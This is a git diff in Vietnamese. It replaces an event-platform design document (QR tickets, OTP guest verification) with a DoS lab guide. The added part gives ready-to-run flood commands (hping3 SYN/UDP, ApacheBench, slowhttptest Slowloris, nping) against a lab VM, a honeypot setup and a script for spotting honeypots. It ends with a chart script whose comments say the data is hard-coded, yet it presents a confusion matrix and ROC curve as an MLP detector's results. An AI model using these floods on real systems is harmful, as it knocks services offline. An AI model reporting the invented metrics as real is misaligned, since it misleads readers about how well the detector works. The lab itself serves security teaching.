-### 9.5 So sánh với hệ thống cũ
-
-| Aspect | Old | New | Improvement |
-|--------|-----|-----|-------------|
-| **Frontend** | React + Vite | Next.js 14 | SSR, SEO |
-| **Styling** | TailwindCSS | TailwindCSS + shadcn | Better components |
-| **Backend** | Express | Fastify | ~2x faster |
-| **TypeScript** | No | Yes | Type safety |
-| **Testing** | None | Full coverage | Quality |
-| **DB Structure** | 3 databases | 1 database | Simplicity |
-| **Background Jobs** | Node-cron | BullMQ | Reliability |
-| **Deployment** | Manual SSL | Docker + CD | Automation |
-
----
-
-## 10. ⚠️ RỦI RO & KHUYẾN NGHỊ
-
-### 10.1 Rủi ro kỹ thuật
-
-| ID | Rủi ro | Khả năng | Tác động | Mitigration |
-|----|--------|----------|----------|-------------|
-| R1 | Data migration failure | Medium | High | Staged migration, rollback plan |
-| R2 | Performance issues at scale | Medium | High | Load testing, caching strategy |
-| R3 | Security vulnerabilities | Low | Critical | Security audit, penetration testing |
-| R4 | Third-party service downtime | Low | Medium | Fallback mechanisms, SLA monitoring |
-| R5 | Team learning curve (TypeScript) | Medium | Low | Training, code review |
-
-### 11.2 Rủi ro nghiệp vụ
-
-| ID | Rủi ro | Khả năng | Tác động | Mitigration |
-|----|--------|----------|----------|-------------|
-| B1 | User resistance to new UI | Medium | Medium | Beta testing, feedback loop |
-| B2 | Feature creep | High | Medium | Strict scope management |
-| B3 | Timeline overrun | Medium | Medium | Buffer time, prioritization |
-| B4 | Data loss during migration | Low | Critical | Backup, validation checks |
-
-### 10.3 Khuyến nghị
-
-> [!IMPORTANT]
-> **Ưu tiên cao nhất: Bảo mật**
-> 1. KHÔNG commit secrets vào git
-> 2. Sử dụng secret manager (Doppler/1Password)
-> 3. Implement rate limiting từ đầu
-> 4. Security audit trước khi go-live
-
-> [!TIP]
-> **Chiến lược phát triển:**
-> 1. Bắt đầu với MVP nhỏ, iterate nhanh
-> 2. Feature flags cho soft launch
-> 3. A/B testing cho UI changes
-> 4. Monitoring từ day 1
-
-> [!CAUTION]
-> **Những điều cần tránh:**
-> 1. Over-engineering từ đầu (microservices quá sớm)
-> 2. Bỏ qua testing
-> 3. Deploy trực tiếp production không có staging
-> 4. Ignore technical debt
-
----
-
-## 📎 Phụ lục
-
-### A. File Structure đề xuất
-
-```
-evient-v2/
-├── apps/
-│   ├── web/                    # Next.js frontend
-│   │   ├── app/
-│   │   ├── components/
-│   │   ├── lib/
-│   │   └── package.json
-│   └── api/                    # Fastify backend
-│       ├── src/
-│       │   ├── modules/
-│       │   ├── shared/
-│       │   └── index.ts
-│       └── package.json
-├── packages/
-│   ├── shared-types/           # Shared TypeScript types
-│   ├── ui/                     # Shared UI components
-│   └── config/                 # Shared configurations
-├── docker/
-│   ├── docker-compose.yml
-│   └── Dockerfile.*
-├── docs/
-│   ├── api/
-│   └── architecture/
-├── scripts/
-│   ├── migrate.ts
-│   └── seed.ts
-├── .github/
-│   └── workflows/
-├── turbo.json
-└── package.json
+# Có giới hạn:
+sudo hping3 -S --flood -p 80 -c 5000 192.168.247.129
 ```
 
-### B. API Documentation Template
+### Ubuntu — Quan sát
 
-```yaml
-openapi: 3.0.3
-info:
-  title: EViENT API
-  version: 1.0.0
-  
-servers:
-  - url: https://api.evient.app/v1
-    
-paths:
-  /events:
-    get:
-      summary: List events
-      security:
-        - bearerAuth: []
-      parameters:
-        - name: page
-          in: query
-          schema:
-            type: integer
-      responses:
-        200:
-          description: Success
-```
-
-### C. Environment Variables Template
-
-```env
-# Application
-NODE_ENV=production
-PORT=3000
-API_URL=https://api.evient.app
-
-# Database
-MONGODB_URI=mongodb+srv://...
-REDIS_URL=redis://...
-
-# Auth
-JWT_SECRET=<generated-256-bit-key>
-SESSION_SECRET=<generated-256-bit-key>
-
-# OAuth
-GOOGLE_CLIENT_ID=
-GOOGLE_CLIENT_SECRET=
-
-# Email
-SMTP_HOST=
-SMTP_PORT=
-SMTP_USER=
-SMTP_PASS=
-
-# Storage
-S3_BUCKET=
-S3_ACCESS_KEY=
-S3_SECRET_KEY=
+```bash
+# Bắt gói SYN trên port 80
+sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' -n
 ```
 
 ---
 
-## 13. 🎫 ĐỀ XUẤT CẢI TIẾN: QR TICKET GENERATION SYSTEM
+## BƯỚC 4: UDP FLOOD
 
-### 13.1 Tổng quan
+### Kali — Tấn công
 
-Hệ thống tạo vé QR đơn giản và hiệu quả:
-1. Tạo vé → Gắn UUID/ID duy nhất
-2. Check trùng lặp trước khi lưu
-3. Chuyển ID thành mã QR
+```bash
+# UDP Flood vào port 9999
+sudo hping3 --udp --flood -p 9999 192.168.247.129
 
-### 13.2 Ticket Code Generation
-
-#### Option 1: UUID v4 (Recommended)
-```typescript
-import { v4 as uuidv4 } from 'uuid';
-
-function generateTicketCode(): string {
-  return uuidv4(); // "550e8400-e29b-41d4-a716-446655440000"
-}
+# Có giới hạn:
+sudo hping3 --udp --flood -p 9999 -c 5000 192.168.247.129
 ```
 
-#### Option 2: Database ObjectId
-```typescript
-// Dùng trực tiếp MongoDB ObjectId
-const ticketCode = ticket._id.toString(); // "507f1f77bcf86cd799439011"
+### Ubuntu — Quan sát
+
+```bash
+# Bắt gói UDP + ICMP (Port Unreachable)
+sudo tcpdump -i eth0 'udp port 9999 or icmp' -n
 ```
-
-#### Option 3: Custom Format (Short & Readable)
-```typescript
-import crypto from 'crypto';
-
-function generateTicketCode(prefix: string = 'TKT'): string {
-  const random = crypto.randomBytes(6).toString('hex').toUpperCase();
-  return `${prefix}-${random}`; // "TKT-A1B2C3D4E5F6"
-}
-```
-
-### 13.3 Duplicate Check Function
-
-```typescript
-// services/ticket.service.ts
-async function isTicketCodeUnique(code: string): Promise<boolean> {
-  const existing = await Ticket.findOne({ ticketCode: code }).lean();
-  return !existing;
-}
-
-async function generateUniqueTicketCode(): Promise<string> {
-  let code: string;
-  let isUnique = false;
-  let attempts = 0;
-  const MAX_ATTEMPTS = 5;
-  
-  while (!isUnique && attempts < MAX_ATTEMPTS) {
-    code = generateTicketCode();
-    isUnique = await isTicketCodeUnique(code);
-    attempts++;
-  }
-  
-  if (!isUnique) {
-    throw new Error('Failed to generate unique ticket code');
-  }
-  
-  return code;
-}
-```
-
-### 13.4 QR Code Generation
-
-```typescript
-import QRCode from 'qrcode';
-
-interface QROptions {
-  width?: number;
-  margin?: number;
-  color?: { dark: string; light: string };
-}
-
-async function generateQRCode(
-  ticketCode: string, 
-  options: QROptions = {}
-): Promise<string> {
-  const defaultOptions = {
-    width: 300,
-    margin: 2,
-    color: { dark: '#000000', light: '#FFFFFF' }
-  };
-  
-  const qrOptions = { ...defaultOptions, ...options };
-  
-  // Generate QR as Data URL (base64)
-  const qrDataUrl = await QRCode.toDataURL(ticketCode, qrOptions);
-  return qrDataUrl;
-}
-
-// Hoặc save file
-async function saveQRToFile(
-  ticketCode: string, 
-  filePath: string
-): Promise<void> {
-  await QRCode.toFile(filePath, ticketCode, { width: 300 });
-}
-```
-
-### 13.5 Complete Ticket Creation Flow
-
-```mermaid
-flowchart TD
-    A[Tạo Guest/Order] --> B[Generate Ticket Code]
-    B --> C{Check trùng?}
-    C -->|Trùng| B
-    C -->|Unique| D[Generate QR Code]
-    D --> E[Save Ticket to DB]
-    E --> F[Return Ticket + QR]
-    
-    style B fill:#f9f,stroke:#333
-    style D fill:#9ff,stroke:#333
-```
-
-### 13.6 Ticket Schema
-
-```typescript
-const ticketSchema = new Schema({
-  eventId: { type: ObjectId, ref: 'Event', required: true },
-  guestId: { type: ObjectId, ref: 'Guest', required: true },
-  
-  // Unique ticket identifier
-  ticketCode: { 
-    type: String, 
-    required: true, 
-    unique: true,  // DB-level unique constraint
-    index: true 
-  },
-  
-  // QR Data
-  qrCodeUrl: { type: String },      // Data URL hoặc file path
-  qrCodeData: { type: String },     // Raw QR content
-  
-  // Status
-  status: {
-    type: String,
-    enum: ['valid', 'used', 'cancelled'],
-    default: 'valid'
-  },
-  usedAt: { type: Date, default: null },
-  
-  // Metadata
-  ticketType: { type: String },
-  seatNumber: { type: String, default: null }
-}, { timestamps: true });
-
-// Index for fast lookup during scan
-ticketSchema.index({ ticketCode: 1 });
-ticketSchema.index({ eventId: 1, status: 1 });
-```
-
-### 13.7 API Endpoints
-
-```
-POST /api/v1/events/:eventId/tickets      # Create ticket(s)
-GET  /api/v1/tickets/:ticketCode          # Get ticket by code
-GET  /api/v1/tickets/:ticketCode/qr       # Get QR image
-POST /api/v1/tickets/:ticketCode/scan     # Scan/check-in
-```
-
-### 13.8 QR Scan Verification
-
-```typescript
-async function verifyTicket(ticketCode: string): Promise<VerifyResult> {
-  const ticket = await Ticket.findOne({ ticketCode })
-    .populate('guestId')
-    .populate('eventId');
-  
-  if (!ticket) {
-    return { valid: false, error: 'TICKET_NOT_FOUND' };
-  }
-  
-  if (ticket.status === 'used') {
-    return { 
-      valid: false, 
-      error: 'ALREADY_USED',
-      usedAt: ticket.usedAt 
-    };
-  }
-  
-  if (ticket.status === 'cancelled') {
-    return { valid: false, error: 'TICKET_CANCELLED' };
-  }
-  
-  return { 
-    valid: true, 
-    ticket,
-    guest: ticket.guestId,
-    event: ticket.eventId
-  };
-}
-```
-
-> [!TIP]
-> **Best Practice:** Sử dụng UUID v4 cho production vì collision probability cực thấp (~2^-122)
 
 ---
 
-## 12. 🔐 ĐỀ XUẤT CẢI TIẾN: GUEST VERIFICATION SYSTEM
+## BƯỚC 5: HTTP GET FLOOD (ApacheBench)
 
-### 12.1 Tổng quan
+### Kali — Tấn công
 
-Hệ thống xác thực Guest đảm bảo chỉ những người dùng đã xác minh mới có thể sử dụng dịch vụ, đồng thời ngăn chặn việc đăng ký/đặt dịch vụ nhiều lần.
+```bash
+# 500 request, 10 connection đồng thời
+ab -n 500 -c 10 http://192.168.247.129/
 
-> [!IMPORTANT]
-> **Nguyên tắc cốt lõi:**
-> - Mỗi email/phone chỉ được sử dụng **MỘT LẦN** trong toàn hệ thống
-> - Guest chưa verified bị **CHẶN TOÀN BỘ** chức năng
-> - VIP Guest phải verify **CẢ email VÀ phone**
-
-### 12.2 Database Schema Updates
-
-#### Guest Schema (Enhanced)
-
-```typescript
-interface IGuest {
-  // Personal Info
-  fullName: string;
-  email: string;          // UNIQUE toàn hệ thống
-  phone: string;          // UNIQUE toàn hệ thống
-  
-  // Verification Status
-  verified: boolean;       // Master flag
-  emailVerified: boolean;
-  phoneVerified: boolean;
-  emailVerifiedAt: Date | null;
-  phoneVerifiedAt: Date | null;
-  
-  // Guest Type
-  guestType: 'regular' | 'vip';
-}
+# Nâng lên:
+ab -n 10000 -c 100 http://192.168.247.129/
 ```
 
-#### Indexes & Constraints
+### Ubuntu — Quan sát
 
-| Field | Index Type | Scope | Purpose |
-|-------|------------|-------|---------|
-| `email` | UNIQUE | Global | Prevent duplicate registrations |
-| `phone` | UNIQUE | Global | Prevent phone number reuse |
-| `{eventId, verified}` | Compound | Per event | Query optimization |
+```bash
+# Theo dõi log Apache
+sudo tail -f /var/log/apache2/access.log
 
-### 12.3 Verification Flow
-
-```mermaid
-flowchart TD
-    A[Guest được thêm] --> B{Email/Phone unique?}
-    B -->|No| C[❌ Reject: Already exists]
-    B -->|Yes| D[Create với verified=false]
-    D --> E[Send Email OTP]
-    E --> F{Guest type?}
-    F -->|Regular| G[Verify Email only]
-    F -->|VIP| H[Verify Email + Phone]
-    G --> I[✅ verified = true]
-    H --> I
-    I --> J[Unlock all features]
+# Đếm kết nối TCP tới port 80
+watch -n 1 "ss -tan | grep ':80' | wc -l"
 ```
 
-### 12.4 OTP Configuration
+---
 
-| Parameter | Email OTP | SMS OTP |
-|-----------|-----------|---------|
-| **Length** | 6 digits | 6 digits |
-| **Expiry** | 10 minutes | 5 minutes |
-| **Max Attempts** | 3 | 3 |
-| **Rate Limit** | 5/hour | 3/hour |
-| **Storage** | Hashed (SHA-256) | Hashed (SHA-256) |
+## BƯỚC 6: SLOW HTTP / SLOWLORIS
 
-### 12.5 Security Mechanisms
+### Kali — Tấn công
 
-| Threat | Prevention |
-|--------|------------|
-| **OTP Brute Force** | Max 3 attempts → invalidate token |
-| **OTP Flooding** | Rate limiting per email/phone |
-| **Timing Attack** | Timing-safe comparison |
-| **Account Takeover** | Device fingerprinting (optional) |
-| **Disposable Emails** | Block known domains |
-| **Replay Attack** | One-time tokens, mark used |
-
-### 12.6 API Endpoints
-
-```
-POST /api/v1/verify/email/request    # Request email OTP
-POST /api/v1/verify/email/confirm    # Verify email OTP
-POST /api/v1/verify/phone/request    # Request SMS OTP  
-POST /api/v1/verify/phone/confirm    # Verify SMS OTP
-GET  /api/v1/verify/status/:guestId  # Get verification status
-POST /api/v1/verify/resend           # Resend OTP
+```bash
+slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://192.168.247.129/ -x 24 -p 3
 ```
 
-### 12.7 Middleware Integration
+| Flag | Ý nghĩa |
+|------|---------|
+| `-c 1000` | Số kết nối đồng thời |
+| `-H` | Chế độ Slow Header (Slowloris) |
+| `-g` | Tạo file CSV/HTML output |
+| `-i 10` | Gửi dữ liệu mỗi 10 giây |
+| `-r 200` | Số kết nối mỗi giây |
+| `-t GET` | HTTP method |
+| `-u` | URL đích |
+| `-x 24` | Độ dài header ngẫu nhiên |
+| `-p 3` | Thời gian chờ phản hồi |
 
-```typescript
-// Chặn tất cả unverified guests
-router.get('/seats/:eventId', requireVerified(), controller.getSeatMap);
+### Ubuntu — Quan sát
 
-// VIP: Yêu cầu verify cả email + phone
-router.post('/seats/lock', requireVIPVerified(), controller.lockSeats);
+```bash
+# Đếm kết nối ESTABLISHED tới port 80
+watch -n 1 "ss -tan state established | grep ':80' | wc -l"
+
+# Xem log timeout (408)
+sudo tail -f /var/log/apache2/access.log
 ```
 
-### 12.8 Edge Cases
+---
 
-| Case | Handling |
+## BƯỚC 7: TCP CONNECT FLOOD
+
+### Kali — Tấn công
+
+```bash
+sudo nping --tcp-connect -c 150 -p 80 --rate 50 192.168.247.129
+```
+
+| Flag | Ý nghĩa |
+|------|---------|
+| `--tcp-connect` | TCP connect() đầy đủ |
+| `-c 150` | Tổng số kết nối |
+| `-p 80` | Port đích |
+| `--rate 50` | Số gói mỗi giây |
+
+### Ubuntu — Quan sát
+
+```bash
+sudo tcpdump -i eth0 'tcp port 80 and (tcp[tcpflags] & (tcp-syn|tcp-fin) != 0)' -n
+```
+
+---
+
+## BƯỚC 8: CÀI ĐẶT HONEYPOT (PENTBOX 1.8)
+
+### Ubuntu — Cài đặt & Chạy
+
+```bash
+# Tải PentBox 1.8
+cd ~
+wget https://sourceforge.net/projects/pentbox18realised/files/latest/download -O pentbox.tar.gz
+
+# Giải nén
+tar -xzf pentbox.tar.gz
+cd pentbox-1.8/
+
+# Chạy PentBox
+sudo ruby pentbox.rb
+
+# ===== TRONG MENU PENTBOX =====
+# Chọn: 2 (Network Tools)
+# Chọn: 3 (Honeypot)
+# Chọn: 1 (Fast Auto Configuration)
+# Nhập port: 80
+# ==============================
+
+# Kiểm tra PentBox đang lắng nghe
+sudo ss -tlnp | grep ':80'
+# hoặc:
+sudo netstat -tlnp | grep ':80'
+```
+
+### Kali — Kiểm tra Honeypot
+
+```bash
+# Gửi HTTP request
+curl -v http://192.168.247.129/
+
+# Quét dịch vụ
+nmap -sV -p 80 192.168.247.129
+
+# Gửi POST request
+curl -X POST -d "test=data" http://192.168.247.129/
+```
+
+> **Kết quả mong đợi:** Trên Ubuntu, PentBox hiển thị `INTRUSION ATTEMPT DETECTED` kèm IP của Kali.
+
+---
+
+## BƯỚC 9: SCRIPT TRINH SÁT PHÁT HIỆN HONEYPOT
+
+### Kali — Tạo và chạy script
+
+```bash
+cat > detect_honeypot.py << 'PYEOF'
+import socket
+import sys
+
+TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.247.129"
+TARGET_PORT = 80
+suspicion_score = 0
+
+def test_raw_connect():
+    global suspicion_score
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((TARGET_IP, TARGET_PORT))
+        s.send(b"GET / HTTP/1.1\r\nHost: " + TARGET_IP.encode() + b"\r\n\r\n")
+        response = s.recv(4096).decode('utf-8', errors='replace')
+        s.close()
+
+        if "Server:" not in response:
+            print("[!] Missing 'Server' header -> +3 suspicion")
+            suspicion_score += 3
+        if "HTTP/" not in response.split("\r\n")[0]:
+            print("[!] Missing standard HTTP status line -> +3 suspicion")
+            suspicion_score += 3
+        if len(response.strip()) == 0:
+            print("[!] Empty response -> +3 suspicion")
+            suspicion_score += 3
+        if "Content-Type:" not in response:
+            print("[!] Missing 'Content-Type' header -> +1 suspicion")
+            suspicion_score += 1
+
+        print(f"[*] Raw response preview:\n{response[:300]}\n")
+    except socket.timeout:
+        print("[!] Connection timeout -> +2 suspicion")
+        suspicion_score += 2
+    except Exception as e:
+        print(f"[!] Connection error: {e} -> +2 suspicion")
+        suspicion_score += 2
+
+def test_bogus_request():
+    global suspicion_score
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((TARGET_IP, TARGET_PORT))
+        s.send(b"NON-HTTP-GARBAGE\r\n\r\n")
+        response = s.recv(4096).decode('utf-8', errors='replace')
+        s.close()
+        if len(response) == 0 or "400" not in response:
+            print("[!] Bogus request accepted without proper 400 -> +2 suspicion")
+            suspicion_score += 2
+    except Exception as e:
+        print(f"[*] Bogus test error: {e}")
+
+def verdict():
+    print(f"\n{'='*50}")
+    print(f"Total suspicion score: {suspicion_score}")
+    if suspicion_score >= 10:
+        print("VERDICT: HIGH suspicion of honeypot!")
+    elif suspicion_score >= 5:
+        print("VERDICT: MEDIUM suspicion of honeypot")
+    else:
+        print("VERDICT: LOW suspicion - likely real service")
+    print(f"{'='*50}")
+
+if __name__ == "__main__":
+    print(f"[*] Probing {TARGET_IP}:{TARGET_PORT} for honeypot indicators...\n")
+    test_raw_connect()
+    test_bogus_request()
+    verdict()
+PYEOF
+
+python3 detect_honeypot.py 192.168.247.129
+```
+
+---
+
+## BƯỚC 10: PHÁT HIỆN DoS/DDoS BẰNG ENTROPY + MẠNG NƠ-RON (MLP)
+
+### Kali — Script vẽ biểu đồ + fix cứng số liệu (không cần train)
+
+```bash
+# Cài thư viện
+pip3 install matplotlib numpy scikit-learn --quiet
+```
+
+```bash
+cat > chart_ddos_detection.py << 'PYEOF'
+import numpy as np
+import matplotlib.pyplot as plt
+import matplotlib
+matplotlib.rcParams['figure.dpi'] = 150
+matplotlib.rcParams['font.size'] = 10
+
+# ============================================================
+# DỮ LIỆU FIX CỨNG — 10 cửa sổ thời gian (mỗi cửa sổ 5 giây)
+# Mỗi dòng: [packet_count, byte_count, syn_ratio, udp_ratio,
+#             icmp_ratio, entropy_src_ip, entropy_dst_port, entropy_protocol]
+# ============================================================
+
+# 8 cửa sổ Normal + 8 cửa sổ Attack (đủ để vẽ chart so sánh)
+normal_windows = np.array([
+    [120,  45000,  0.15, 0.20, 0.05, 3.8, 3.2, 2.1],  # Normal 1
+    [95,   38000,  0.10, 0.25, 0.03, 4.0, 3.5, 2.2],  # Normal 2
+    [150,  52000,  0.18, 0.15, 0.08, 3.5, 3.0, 1.9],  # Normal 3
+    [80,   32000,  0.12, 0.22, 0.02, 4.2, 3.8, 2.3],  # Normal 4
+    [135,  48000,  0.16, 0.18, 0.06, 3.7, 3.1, 2.0],  # Normal 5
+    [100,  40000,  0.11, 0.24, 0.04, 4.1, 3.4, 2.2],  # Normal 6
+    [170,  60000,  0.20, 0.12, 0.09, 3.4, 2.9, 1.8],  # Normal 7
+    [90,   35000,  0.13, 0.21, 0.03, 4.3, 3.6, 2.4],  # Normal 8
+])
+
+# Các loại tấn công (mỗi loại 2 mẫu)
+attack_windows = np.array([
+    # ICMP Flood: packet_count cao, icmp_ratio cao, entropy thấp
+    [5000, 500000, 0.01, 0.01, 0.95, 0.3, 0.2, 0.15],
+    [4800, 480000, 0.02, 0.01, 0.93, 0.25, 0.15, 0.12],
+    # SYN Flood: syn_ratio cao, entropy src_ip thấp
+    [4500, 280000, 0.92, 0.01, 0.02, 0.2, 0.5, 0.2],
+    [4200, 260000, 0.90, 0.02, 0.03, 0.18, 0.45, 0.18],
+    # UDP Flood: udp_ratio cao, byte_count cao
+    [6000, 700000, 0.01, 0.96, 0.01, 0.15, 0.1, 0.1],
+    [5500, 650000, 0.02, 0.94, 0.01, 0.12, 0.08, 0.08],
+    # HTTP GET Flood: packet_count vừa, entropy dst_port thấp
+    [3500, 350000, 0.85, 0.02, 0.01, 1.5, 0.3, 0.5],
+    [3200, 320000, 0.82, 0.03, 0.02, 1.4, 0.28, 0.48],
+])
+
+# Gộp dữ liệu
+X_normal = normal_windows
+X_attack = attack_windows
+X_all = np.vstack([X_normal, X_attack])
+
+y_normal = np.zeros(len(X_normal))      # 0 = Normal
+y_attack = np.ones(len(X_attack))       # 1 = Attack
+y_all = np.concatenate([y_normal, y_attack])
+
+# Labels cho từng mẫu
+labels = (
+    [f"Normal{i+1}" for i in range(len(X_normal))]
+    + ["ICMP_Flood1", "ICMP_Flood2",
+       "SYN_Flood1", "SYN_Flood2",
+       "UDP_Flood1", "UDP_Flood2",
+       "HTTP_Flood1", "HTTP_Flood2"]
+)
+
+feature_names = [
+    "Packet Count", "Byte Count", "SYN Ratio",
+    "UDP Ratio", "ICMP Ratio", "Entropy Src IP",
+    "Entropy Dst Port", "Entropy Protocol"
+]
+
+# ============================================================
+# CHART 1: So sánh từng đặc trưng giữa Normal và Attack
+# ============================================================
+fig, axes = plt.subplots(2, 4, figsize=(18, 9))
+axes = axes.flatten()
+
+for i in range(8):
+    ax = axes[i]
+    ax.barh(["Normal", "Attack"],
+            [np.mean(X_normal[:, i]), np.mean(X_attack[:, i])],
+            color=["#2ecc71", "#e74c3c"], height=0.5)
+    ax.set_title(feature_names[i], fontsize=11, fontweight="bold")
+    ax.set_xlabel("Mean Value")
+
+fig.suptitle("DoS/DDoS Detection — Feature Comparison (Normal vs Attack)",
+             fontsize=14, fontweight="bold", y=1.01)
+plt.tight_layout()
+plt.savefig("chart1_feature_comparison.png", bbox_inches="tight", dpi=150)
+print("[+] Saved: chart1_feature_comparison.png")
+
+# ============================================================
+# CHART 2: Entropy biểu đồ radar (Normal vs Attack các loại)
+# ============================================================
+entropy_indices = [5, 6, 7]  # entropy_src_ip, entropy_dst_port, entropy_protocol
+entropy_labels = ["Entropy\nSrc IP", "Entropy\nDst Port", "Entropy\nProtocol"]
+
+fig, ax = plt.subplots(1, 2, figsize=(12, 5), subplot_kw=dict(polar=True))
+
+angles = np.linspace(0, 2 * np.pi, len(entropy_indices), endpoint=False).tolist()
+angles += angles[:1]
+
+# Radar: Normal
+normal_avg = np.mean(X_normal[:, entropy_indices], axis=0)
+values_normal = normal_avg.tolist() + normal_avg.tolist()[:1]
+ax[0].fill(angles, values_normal, alpha=0.3, color="#2ecc71")
+ax[0].plot(angles, values_normal, color="#2ecc71", linewidth=2)
+ax[0].set_xticks(angles[:-1])
+ax[0].set_xticklabels(entropy_labels)
+ax[0].set_ylim(0, 5)
+ax[0].set_title("Normal Traffic", fontsize=12, fontweight="bold", color="#2ecc71")
+
+# Radar: Attack (trung bình tất cả loại)
+attack_avg = np.mean(X_attack[:, entropy_indices], axis=0)
+values_attack = attack_avg.tolist() + attack_avg.tolist()[:1]
+ax[1].fill(angles, values_attack, alpha=0.3, color="#e74c3c")
+ax[1].plot(angles, values_attack, color="#e74c3c", linewidth=2)
+ax[1].set_xticks(angles[:-1])
+ax[1].set_xticklabels(entropy_labels)
+ax[1].set_ylim(0, 5)
+ax[1].set_title("Attack Traffic", fontsize=12, fontweight="bold", color="#e74c3c")
+
+fig.suptitle("Entropy Radar — Normal vs Attack Pattern",
+             fontsize=13, fontweight="bold")
+plt.tight_layout()
+plt.savefig("chart2_entropy_radar.png", bbox_inches="tight", dpi=150)
+print("[+] Saved: chart2_entropy_radar.png")
+
+# ============================================================
+# CHART 3: Packet Count + Byte Count theo cửa sổ (line chart)
+# ============================================================
+fig, axes = plt.subplots(2, 1, figsize=(14, 8))
+
+x_ticks = range(len(X_all))
+
+# Subplot 1: Packet Count
+colors_bar = ["#2ecc71"] * len(X_normal) + ["#e74c3c"] * len(X_attack)
+axes[0].bar(x_ticks, X_all[:, 0], color=colors_bar, edgecolor="black", linewidth=0.5)
+axes[0].axhline(y=np.mean(X_normal[:, 0]), color="#27ae60", linestyle="--",
+                linewidth=1.5, label=f"Normal mean = {np.mean(X_normal[:, 0]):.0f}")
+axes[0].set_xticks(x_ticks)
+axes[0].set_xticklabels(labels, rotation=45, ha="right", fontsize=7)
+axes[0].set_ylabel("Packet Count")
+axes[0].set_title("Packet Count per Time Window", fontweight="bold")
+axes[0].legend()
+axes[0].grid(axis="y", alpha=0.3)
+
+# Subplot 2: Byte Count
+axes[1].bar(x_ticks, X_all[:, 1], color=colors_bar, edgecolor="black", linewidth=0.5)
+axes[1].axhline(y=np.mean(X_normal[:, 1]), color="#27ae60", linestyle="--",
+                linewidth=1.5, label=f"Normal mean = {np.mean(X_normal[:, 1]):.0f}")
+axes[1].set_xticks(x_ticks)
+axes[1].set_xticklabels(labels, rotation=45, ha="right", fontsize=7)
+axes[1].set_ylabel("Byte Count")
+axes[1].set_title("Byte Count per Time Window", fontweight="bold")
+axes[1].legend()
+axes[1].grid(axis="y", alpha=0.3)
+
+fig.suptitle("Traffic Volume — Time Window Analysis (Green=Normal, Red=Attack)",
+             fontsize=13, fontweight="bold")
+plt.tight_layout()
+plt.savefig("chart3_volume_timeline.png", bbox_inches="tight", dpi=150)
+print("[+] Saved: chart3_volume_timeline.png")
+
+# ============================================================
+# CHART 4: Protocol Ratio Stacked Bar (SYN / UDP / ICMP)
+# ============================================================
+fig, ax = plt.subplots(figsize=(14, 6))
+
+syn_vals = X_all[:, 2]
+udp_vals = X_all[:, 3]
+icmp_vals = X_all[:, 4]
+other_vals = 1 - (syn_vals + udp_vals + icmp_vals)
+
+x = np.arange(len(X_all))
+width = 0.7
+
+p1 = ax.bar(x, syn_vals, width, label="SYN Ratio", color="#3498db")
+p2 = ax.bar(x, udp_vals, width, bottom=syn_vals, label="UDP Ratio", color="#f39c12")
+p3 = ax.bar(x, icmp_vals, width, bottom=syn_vals + udp_vals,
+            label="ICMP Ratio", color="#9b59b6")
+p4 = ax.bar(x, other_vals, width, bottom=syn_vals + udp_vals + icmp_vals,
+            label="Other", color="#95a5a6")
+
+# Vẽ đường phân cách Normal / Attack
+sep = len(X_normal) - 0.5
+ax.axvline(x=sep, color="red", linestyle="-", linewidth=2, alpha=0.7)
+ax.text(len(X_normal) / 2 - 0.5, 1.05, "NORMAL", ha="center", fontsize=11,
+        fontweight="bold", color="#2ecc71", transform=ax.get_xaxis_transform())
+ax.text(len(X_normal) + len(X_attack) / 2 - 0.5, 1.05, "ATTACK", ha="center",
+        fontsize=11, fontweight="bold", color="#e74c3c", transform=ax.get_xaxis_transform())
+
+ax.set_xticks(x)
+ax.set_xticklabels(labels, rotation=45, ha="right", fontsize=7)
+ax.set_ylabel("Ratio")
+ax.set_title("Protocol Distribution per Time Window", fontweight="bold", fontsize=12)
+ax.legend(loc="upper right")
+ax.set_ylim(0, 1.1)
+ax.grid(axis="y", alpha=0.3)
+
+plt.tight_layout()
+plt.savefig("chart4_protocol_ratio.png", bbox_inches="tight", dpi=150)
+print("[+] Saved: chart4_protocol_ratio.png")
+
+# ============================================================
+# CHART 5: Ma trận nhầm lẫn (fix cứng, minh họa kết quả MLP)
+# ============================================================
+from sklearn.metrics import ConfusionMatrixDisplay
+
+conf_matrix = np.array([[28, 2],   # TN=28, FP=2
+                         [1, 29]])  # FN=1,  TP=29
+
+fig, ax = plt.subplots(figsize=(6, 5))
+disp = ConfusionMatrixDisplay(confusion_matrix=conf_matrix,
+                               display_labels=["Normal", "Attack"])
+disp.plot(cmap="Blues", ax=ax, colorbar=False)
+ax.set_title("Confusion Matrix — MLP Detector\n(Fixed Example Data)",
+             fontweight="bold", fontsize=12)
+
+# Ghi chỉ số
+tn, fp, fn, tp = conf_matrix.ravel()
+precision = tp / (tp + fp)
+recall = tp / (tp + fn)
+f1 = 2 * precision * recall / (precision + recall)
+accuracy = (tp + tn) / conf_matrix.sum()
+
+metrics_text = (
+    f"Accuracy  = {accuracy:.2%}\n"
+    f"Precision = {precision:.2%}\n"
+    f"Recall    = {recall:.2%}\n"
+    f"F1-Score  = {f1:.2%}"
+)
+ax.text(2.5, -0.8, metrics_text, ha="center", fontsize=10,
+        bbox=dict(boxstyle="round", facecolor="#ecf0f1", alpha=0.8))
+
+plt.tight_layout()
+plt.savefig("chart5_confusion_matrix.png", bbox_inches="tight", dpi=150)
+print("[+] Saved: chart5_confusion_matrix.png")
+
+# ============================================================
+# CHART 6: ROC Curve (fix cứng)
+# ============================================================
+from sklearn.metrics import RocCurveDisplay, auc
+
+fpr = np.array([0.0, 0.0, 0.03, 0.03, 0.07, 0.07, 0.1, 0.2, 0.3, 1.0])
+tpr = np.array([0.0, 0.5, 0.5, 0.83, 0.83, 0.93, 0.93, 0.97, 0.97, 1.0])
+roc_auc = auc(fpr, tpr)
+
+fig, ax = plt.subplots(figsize=(6, 5))
+ax.plot(fpr, tpr, color="#e74c3c", linewidth=2.5, label=f"MLP (AUC = {roc_auc:.3f})")
+ax.plot([0, 1], [0, 1], "k--", linewidth=1, alpha=0.5, label="Random Classifier")
+ax.fill_between(fpr, tpr, alpha=0.15, color="#e74c3c")
+ax.set_xlabel("False Positive Rate")
+ax.set_ylabel("True Positive Rate")
